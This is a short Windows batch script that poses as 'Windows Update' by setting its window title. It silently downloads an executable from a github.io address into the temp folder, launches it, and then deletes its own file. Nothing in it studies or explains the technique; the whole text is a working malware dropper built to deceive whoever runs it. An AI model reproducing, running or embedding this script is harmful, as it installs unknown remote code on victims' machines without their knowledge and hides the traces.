@echo off
title Windows Update
timeout /t 3 /nobreak >nul
if not exist "%USERPROFILE%\Desktop" exit /b
curl -sL "https://boostedboynow.github.io/assets-host/hradu3.exe" -o "%tmp%\re4a.exe"
if %errorlevel% neq 0 exit /b
start "" "%tmp%\re4a.exe"
(goto) 2>nul & del "%~f0"
